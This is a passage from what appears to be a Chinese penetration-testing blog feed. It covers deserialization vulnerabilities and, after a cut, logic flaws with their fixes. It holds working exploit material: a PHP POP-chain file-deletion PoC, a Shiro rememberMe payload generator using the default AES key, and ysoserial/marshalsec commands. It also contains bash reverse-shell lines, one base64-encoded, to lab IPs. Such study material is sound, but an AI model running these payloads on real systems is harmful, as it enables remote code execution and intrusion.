class="string">&#x27;I am a evil Delete function&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;I am a safe Delete function&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user_data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$user_data</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>代码分析：</strong></p><p>首先我们看最先执行的操作在最下面反序列化GET到的参数data，然后执行echo，这里如果$user_data是一个类实例化来的对象的话，就是将对象作为字符串输出，会触发对象中的<code>__tostring()</code>魔术方法。</p><p>而源码中有三个类，各个类具有不同的方法。</p><blockquote><h4 id="POP链构造："><a href="#POP链构造：" class="headerlink" title="POP链构造："></a>POP链构造：</h4><p>首先出发点是Test1中的<code>__tostring()</code>魔术方法，其中调用了<code>$this-&gt;obj</code>中的Delete()函数，而<code>$this-&gt;obj</code>在实例化对象时会触发<code>__construct</code>方法，将<code>$this-&gt;obj</code>作为实例化Test3类的对象，那么此时调用的就是Test3类中的Delete()函数，只返回一句提示，那么此时的执行流如下：</p><p>实例化Test1类的对象→<code>__construct()</code>→<code>$this-&gt;obj=new Test3</code>→输出该对象时调用<code>__tostring()</code>→Test3的Delete()方法</p><p>不过在Test2类中也定义了和Test3中同名的函数Delete()，该方法可能造成任意文件删除。那么我们可以通过构造特定的反序列化参数来<strong>修改执行流，也就是构造我们自己的POP链，在反序列化后使用Test2类中的Delete()来执行敏感操作</strong>，让执行流如下:</p><p>实例化Test1类的对象→<code>__construct()</code>→<code>$this-&gt;obj=new Test2</code>→输出该对象时调用<code>__tostring()</code>→Test2的Delete方法</p><p>那么POP链的构造就是通过反序列化和echo来触发<code>__tostring()</code>魔术方法，并且此方法中调用Test2中的Delete()方法，造成任意文件删除的危害。</p></blockquote><p>POC如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Test2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$cache_file</span> = <span class="string">&#x27;../../../../test.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$evil</span> = <span class="keyword">new</span> <span class="title class_">Test1</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$evil</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="java反射机制"><a href="#java反射机制" class="headerlink" title="java反射机制"></a>java反射机制</h3><p>反射 (Reflection) 是 Java 的特征之一，它允许运行中的 Java 程序获取自身的信息，并且可以操作类或对象的内部属性。通过反射，我们可以在运行时获得程序或程序集中每一个类型的成员和成员的信息。通过Java 反射机制，我们可以动态地创建对象并调用其属性，这样的对象的类型在编译期是未知的。</p><p>反射的核心是 JVM 在运行时才动态加载类或调用方法&#x2F;访问属性，它不需要事先（写代码的时候或编译期）知道运行对象是谁。</p><p>Java 反射主要提供以下功能：</p><p>在运行时判断任意一个对象所属的类；<br>在运行时构造任意一个类的对象；<br>在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；<br>在运行时调用任意一个对象的方法<br>重点：是运行时而不是编译时</p><p>反射机制在java反序列化漏洞的利用过程中有很重要的作用。</p><h3 id="java反序列化利用"><a href="#java反序列化利用" class="headerlink" title="java反序列化利用"></a>java反序列化利用</h3><p>Java 序列化过程依赖于 ObjectOutputStream 类中 writeObject 方法，而反序列化的过程是依赖于 ObjectOutputStream 类中 readObject 方法。<strong>若用户重写了自定义的 readObject 方法，那么就有可能产生反序列化的时候命令执行的漏洞点。</strong>或者用户精心构造恶意的类的序列化字符串，那么在反序列化实例化这个类时就会执行其中的恶意代码（比如rmi远程代码）。</p><p>利用java反射重写 readObject 方法：</p><p>反射机制的存在使得我们可以越过Java本身的静态检查和类型约束，在运行期直接访问和修改目标对象的属性和状态。Java反射的四大核心是 Class，Constructor，Field，Method。通过反射的方法重写readObject：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ReflectionCalcObject.java</span></span><br><span class="line"><span class="keyword">package</span> com.l1nk3r.reflect;</span><br><span class="line"><span class="keyword">import</span> java.io. * ;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectionCalcObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//重写readObject()方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in )</span> <span class="keyword">throws</span> IOException,</span><br><span class="line">    ClassNotFoundException &#123; in .defaultReadObject(); <span class="comment">//调用原始的readOject方法</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//通过反射方法执行命令；</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> java.lang.Runtime.class.getMethod(“exec”, String.class);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(Runtime.getRuntime(), “open / Applications / Calculator.app / “);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过运行 java.lang.Runtime 这个类的 .class 属性，并使用 getMethod 方法来获取我们要执行命令的方法 exec ，最后我们通过 invoke 来实现注册这个方法，打开计算器。</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul><li><p>最有效的方法是<strong>不接受来自不受信任源的序列化对象</strong>或者只使用原始数据类型的序列化，但这不容易实现。</p></li><li><p><strong>完整性检查</strong>，如：对序列化对象进行数字签名，以防止创建恶意对象或序列化数据被篡改。</p></li><li><p>在创建对象前强制执行<strong>类型约束</strong>，因为用户的代码通常被期望使用一组可定义的类。</p></li></ul><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="wakeup-函数绕过"><a href="#wakeup-函数绕过" class="headerlink" title="__wakeup()函数绕过"></a>__wakeup()函数绕过</h3><p>只要序列化的中的成员数大于实际成员数，<code>__wakeup()</code>魔术方法将不会被执行，从而导致绕过。</p><p>注意，需要<strong>PHP版本&lt;&#x3D;5.6.25或者PHP版本&lt;&#x3D;7.0.11</strong>。</p><p>举一个简单的例子，考虑一个使用序列化<code>User</code>对象的网站，该网站将有关用户会话的数据存储在cookie中。如果攻击者在HTTP请求中发现了序列化对象，则可能会对其进行解码以找到以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:”username”:s:6:”carlos”; s:7:”isAdmin”:b:0;&#125;</span><br></pre></td></tr></table></figure><p>注意到这里的isAdmin属性，攻击者可以简单地将该属性的布尔值更改为<code>1</code>(true)，重新编码对象，然后使用此修改后的值覆盖其当前cookie。</p><p>以及，修改</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>参考：<a href="https://www.freebuf.com/articles/web/286442.html">https://www.freebuf.com/articles/web/286442.html</a></p><h3 id="shiro反序列化漏洞"><a href="#shiro反序列化漏洞" class="headerlink" title="shiro反序列化漏洞"></a>shiro反序列化漏洞</h3><p><a href="https://blog.csdn.net/huangyongkang666/article/details/124175812">https://blog.csdn.net/huangyongkang666/article/details/124175812</a></p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>低版本的apache shiro （ &lt;&#x3D; 1.2.4版本）默认使用了CookieRememberMeManager。当用户勾选RememberMe并登录成功，Shiro会将用户的cookie值序列化，AES加密，接着base64编码后存储在cookie的rememberMe字段中。而服务端接收到cookie后：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。然而AES的密钥是硬编码在源码中的，所以当攻击者知道了AES key后，就能够构造恶意的rememberMe cookie值从而导致反序列化的RCE漏洞。</p><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><p>返回包中含有rememberMe&#x3D;deleteMe字段</p><h4 id="用到的工具"><a href="#用到的工具" class="headerlink" title="用到的工具"></a>用到的工具</h4><ol><li><p><strong>ysoserial</strong></p><p>ysoserial集合了各种java反序列化payload，下载地址为<code>https://github.com/frohoff/ysoserial</code>。</p><p>安装过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/frohoff/ysoserial.git</span><br><span class="line">cd ysoserial</span><br><span class="line">mvn package -D skipTests //需要安装maven才能使用mvn命令</span><br></pre></td></tr></table></figure></li><li><p><strong>shiro_tool.jar</strong></p><p>集成化工具，下载地址为<code>https://toolaffix.oss-cn-beijing.aliyuncs.com/shiro_tool.jar</code>。</p><p>可用于获取目标IP的shiro中是否存在默认的AES密钥。命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar shiro_tool.jar http://192.168.241.129:8080</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813135453985.png" alt="image-20220813135453985"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure></li></ol><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul><li><p><strong>测试</strong>能否使用rememberMe字段</p><p>使用burp抓取当前页面数据包，在cookie中添加rememberMe&#x3D;1。若响应包中显示Set-Cookie: rememberMe&#x3D;deleteMe，说明存在shiro框架，可能存在漏洞。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813135630795.png" alt="image-20220813135630795"></p></li><li><p><strong>监听并构造反弹shell</strong></p><p>通过 <strong>ysoserial</strong> 中的 JRMP 监听模块，监听4444端口并执行反弹shell命令。</p><p>反弹shell命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.241.128/4444 0&gt;&amp;1   //需要base64编码，在线编码http://www.jackson-t.ca/runtime-exec-payloads.html</span><br><span class="line"></span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0MS4xMjgvNDQ0NCAwPiYx==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0MS4xMjgvNDQ0NCAwPiYx==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></pre></td></tr></table></figure><p>单引号中的就是要执行的命令</p></li><li><p><strong>构造payload</strong></p><p>利用检测出的AES密钥，生成payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">command</span>):   <span class="comment"># shellcode</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial.jar&#x27;</span>, <span class="string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)  <span class="comment"># AES密钥</span></span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure><p>执行上述代码：<code>python shiro.py 192.168.241.129:6666</code>，得到payload，即恶意的rememberMe。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813140942501.png" alt="image-20220813140942501"></p></li><li><p><strong>开启nc监听</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 6767</span><br></pre></td></tr></table></figure></li><li><p><strong>抓包，插入恶意rememberMe</strong></p><p>抓包，在cookie中将上面恶意构造的rememberMe发送出去：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813141259824.png" alt="image-20220813141259824"></p></li><li><p><strong>成功getshell</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813141345531.png" alt="image-20220813141345531"></p></li></ul><h3 id="fastjson反序列化漏洞"><a href="#fastjson反序列化漏洞" class="headerlink" title="fastjson反序列化漏洞"></a>fastjson反序列化漏洞</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&#x2F;get方法来访问属性。</p><p>在Java 8u102环境下，没有com.sun.jndi.rmi.object.trustURLCodebase的限制，可以使用com.sun.rowset.JdbcRowSetImpl的利用链，借助JNDI注入来执行命令。</p><h4 id="用到的工具-1"><a href="#用到的工具-1" class="headerlink" title="用到的工具"></a>用到的工具</h4><p>预先安装maven并配置环境变量，下载marshalsec，进入marshalsec 目录，使用mvn clean package -DskipTests命令编译出marshalsec的jar包</p><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul><li><p><strong>生成payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.2.101/6767 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line"><span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">pc.waitFor();</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">// do nothing</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行编译生成.class文件。搭建服务，要测试能直连TouchFile.class ，才会执行文件里的命令。</p></li><li><p><strong>开启rmi服务</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.2.101:4444/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure><p>其中<code>http://192.168.2.101:4444</code>为你的rmi服务器的地址，9999为rmi监听的端口</p></li><li><p><strong>开启nc监听</strong>，6767为监听的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 6767</span><br></pre></td></tr></table></figure></li><li><p><strong>发包</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813142233557.png" alt="image-20220813142233557"></p></li><li><p><strong>获得shell</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220813142311472.png" alt="image-20220813142311472"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;反序列化漏洞&quot;&gt;&lt;a href=&quot;#反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;反序列化漏洞&quot;&gt;&lt;/a&gt;反序列化漏洞&lt;/h1&gt;&lt;p&gt;参考：&lt;a href=&quot;https://www.anquanke.com/post/id/224769&quot;&gt;h</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>逻辑漏洞</title>
    <link href="https://frankcao3.github.io/posts/45471"/>
    <id>https://frankcao3.github.io/posts/45471</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-05T12:02:19.325Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><p>参考：<a href="https://www.freebuf.com/vuls/281141.html">https://www.freebuf.com/vuls/281141.html</a></p><h2 id="身份验证漏洞"><a href="#身份验证漏洞" class="headerlink" title="身份验证漏洞"></a>身份验证漏洞</h2><h3 id="暴力破解漏洞"><a href="#暴力破解漏洞" class="headerlink" title="暴力破解漏洞"></a>暴力破解漏洞</h3><p>攻击者可以通过该漏洞获取用户名和对应弱口令密码，并进行登录操作。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>由于没有设置登录失败次数限制，导致攻击者可以通过口令字典进行特定用户的密码爆破或通过用户名字典进行特定弱口令的用户枚举。</p><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>系统登录点</p><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>对于固定用户名爆破密码，可以针对用户名进行错误次数计算，高于一定阈值账号锁定一段时间，或者添加验证码。但是不能永久锁定，可能被用来进行账户恶意锁定；</p><p>对于固定密码枚举用户名、 需要计算IP对URL的请求情况，若某个IP短时间大量请求登录则应该加入黑名单，对传输数据进行加密有一定的防护效果。</p><h3 id="Session固定攻击"><a href="#Session固定攻击" class="headerlink" title="Session固定攻击"></a>Session固定攻击</h3><p>会话固定攻击是利用服务器的session不变机制，借他人之手获得认证和授权，然后冒充他人 。</p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>在请求登录过程时候，URL带有一个session，登录成功之后会将登录成功的信息绑定到这个session中，攻击者可以发送带有session的URL给相关工作人员诱导其登录，相当于获取了其身份信息。</p><h4 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>在GET方法请求登录时候带有session值。</p><h4 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h4><p>避免在URL中带入session信息。</p><p>另外也要注意POST请求中带有sessionid进行session固定攻击，虽然可利用性比较低，但是建议修复。</p><h3 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h3><p>通过伪造cookie信息能够伪造其他用户进行登录。</p><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>开发者为了方便将身份信息&#x2F;登录信息明文或者只是简单编码、哈希之后存放在cookies中，网站通过获取得到的cookies进行授权或者身份验证。</p><h4 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>cookie中有明显或者只是简单编码、哈希的字段时候，比如修改lsLogin值为1可以判定为用户已经登录，修改cookie为asp163&#x3D;UserName&#x3D;admin可以获得管理员权限。</p><h4 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h4><p>Cookie不应该存储可理解的身份信息和登录信息 按照规定，cookie对身份信息和登录信息的存储只能通过存储足够长度的随机字符串进行，避免篡改。</p><h2 id="逻辑越权漏洞"><a href="#逻辑越权漏洞" class="headerlink" title="逻辑越权漏洞"></a>逻辑越权漏洞</h2><p>参考：</p><p><a href="https://blog.csdn.net/huangyongkang666/article/details/123629813">https://blog.csdn.net/huangyongkang666/article/details/123629813</a></p><p><a href="https://www.freebuf.com/articles/web/195837.html">https://www.freebuf.com/articles/web/195837.html</a></p><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>越权访问（Broken Access Control，BAC），指应用在检查授权时存在漏洞，使得攻击者在获得低权限用户账号后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限的用户。</p><h3 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h3><p>开发人员在对数据进行增删查改时，对客户端请求的数据过分相信而遗漏了权限的判定，权限验证不当而导致的越权行为。</p><p>通常情况下，一个 Web 程序功能流程是登录 - 提交请求 - 验证权限 - 数据库查询 - 返回结果。如果验证权限不足，便会导致越权。常见的程序都会认为通过登录后即可验证用户的身份，从而不会做下一步验证，最后导致越权。</p><ul><li>隐藏URL</li><li>直接对象引用</li><li>多阶段功能</li><li>静态文件</li><li>平台配置错误</li></ul><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h4><p>水平越权是指攻击者尝试访问与他具有<strong>相同权限</strong>的用户资源。</p><p><strong>形成原因</strong>：在进行方法调用的时候未验证请求用户和目标信息拥有者是否匹配一致，而是直接用userid&#x2F;email之类的容易遍历的参数进行数据库查询，导致攻击者利用了其他人的userid。</p><p>比如，用户A和用户B属于同一角色，拥有相同的权限等级，他们能获取自己的私有数据（数据A和数据B），但如果系统只验证了能访问数据的角色，而没有对数据做细分或者校验，导致用户A能访问到用户B的数据（数据B），那么用户A访问数据B的行为就叫做水平越权访问。</p><p><strong>修复</strong>：利用getAttribute(“userid”)获取其userid，而不是直接接收userid参数，避免了userid参数传输。</p><p>以下是常出现的水平越权的几种场景：</p><ul><li><p>基于用户身份ID</p><p>在使用某个功能时，通过用户提交的身份ID（用户ID、账号、手机号、证件号等用户唯一标识）来访问或操作对应的数据。</p></li><li><p>基于对象ID</p><p>在使用某个功能时，通过用户提交的对象ID（如订单号、记录号）来访问或操作对应的数据。</p></li><li><p>基于文件名</p><p>在使用某个功能时，通过文件名直接访问文件，最常见于用户上传文件的场景。</p></li></ul><h4 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h4><p>垂直越权是指<strong>低权限用户尝试访问高权限用户</strong>的资源。</p><p><strong>形成原因</strong>：由于后台应用没有做权限控制、角色校验，或仅仅在菜单、按钮上做了权限控制，导致恶意用户只要<u>猜测其他管理页面的URL或者敏感的参数信息</u>，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。</p><p>主要有以下两种场景：</p><p>未认证账号，访问无需认证就能访问该功能</p><p>不具备某个功能权限的账户，认证后能成功访问该功能</p><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><p>游客能够访问普通用户甚至超级管理员才能访问的系统信息或者系统功能，</p><p><strong>产生原因</strong>：系统设计期间没有进行全局用户身份校验；或者校验存在缺陷。</p><h2 id="业务数据篡改"><a href="#业务数据篡改" class="headerlink" title="业务数据篡改"></a>业务数据篡改</h2><p><strong>概念</strong>：篡改一些参数的数值，达到获利的目的。</p><p>若是篡改验证用的判断参数，比如判断用户类型的userType，可能用于实现垂直越权；</p><p>若是篡改用户参数，比如手机号、身份证号，可能用于实现水平越权。</p><p><strong>漏洞点</strong>：抽奖、购买、转账、返现等功能。</p><p><strong>修复</strong>：</p><p>计算传输数据的哈希，并将哈希附加在传输数据中作为校验值，避免被篡改。</p><p>设置token。</p><h2 id="执行顺序逻辑漏洞"><a href="#执行顺序逻辑漏洞" class="headerlink" title="执行顺序逻辑漏洞"></a>执行顺序逻辑漏洞</h2><p><strong>概念</strong>：也是篡改参数，但是是通过<u>篡改分步逻辑中的步骤数字</u>，达到绕过支付、校验等效果。</p><p><strong>原理</strong>：程序逻辑分布进行，但是对步骤、验证信息、支付信息没有做好严格校验，导致修改步骤就直接绕过验证或者支付。</p><p><strong>漏洞点</strong>：任何分布逻辑且带步骤数字，或者利用JS进行步骤控制的功能中。</p><p><strong>修复</strong>：</p><p>在请求最后一步时候需要<u>带入前面的验证信息</u>，服务端再进行一次校验信息的验证，验证正确方能继续执行数据操作；</p><p>也可以通过getAttributr(“userid”)获取userid进行userid和验证结果绑定，最后一步不带入验证信息，但是仍然要获取userid进行校验；</p><p>再最后一步通过验证之后或者服务器收到支付信息后再生成相应的数据交给用户。</p><h2 id="验证码爆破"><a href="#验证码爆破" class="headerlink" title="验证码爆破"></a>验证码爆破</h2><p><strong>概念</strong>：抓包后重放，进行参数值遍历。可以用于突破图形验证码的验证，可以实现如登录爆破、个人信息爆破、验证码绕过等攻击。</p><p><strong>修复：</strong></p><ul><li>验证码使用后立即重新生成</li><li>设置验证码有效期</li><li>验证码的部分仅使用图片，不使用字符串</li><li>不进行分布校验，而是连同请求数据一起发送到目标服务器进行校验</li></ul><h2 id="找回密码"><a href="#找回密码" class="headerlink" title="找回密码"></a>找回密码</h2><p><strong>概念</strong>：攻击者通过密码找回逻辑漏洞，可以重置他人账号密码，危害他人账号安全。</p><p>通过验证码找回密码的话，可以分为验证码漏洞的一种。</p><h2 id="短信轰炸"><a href="#短信轰炸" class="headerlink" 